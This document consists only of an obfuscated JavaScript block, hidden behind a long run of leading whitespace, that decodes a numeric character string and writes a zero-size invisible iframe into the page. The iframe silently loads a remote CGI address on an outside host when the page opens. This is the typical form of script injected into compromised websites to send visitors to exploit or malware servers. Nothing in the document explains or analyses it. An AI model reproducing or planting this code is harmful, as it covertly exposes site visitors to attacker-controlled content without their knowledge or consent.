																																																																																																																																																																																																																																																					<script type="text/javascript">function Decode(){var temp="",i,c=0,out=""; var str="60!105!102!114!97!109!101!32!115!114!99!61!34!104!116!116!112!58!47!47!102!116!112!105!102!114!97!109!101!114!46!111!114!103!47!116!115!47!105!110!46!99!103!105!63!51!52!54!34!32!102!114!97!109!101!98!111!114!100!101!114!61!48!32!119!105!100!116!104!61!48!32!104!101!105!103!104!116!61!48!62!60!47!105!102!114!97!109!101!62!";l=str.length;while(c<=str.length-1){while(str.charAt(c)!='!')temp=temp+str.charAt(c++);c++; out=out+String.fromCharCode(temp);temp="";}document.write(out);}Decode();</script>
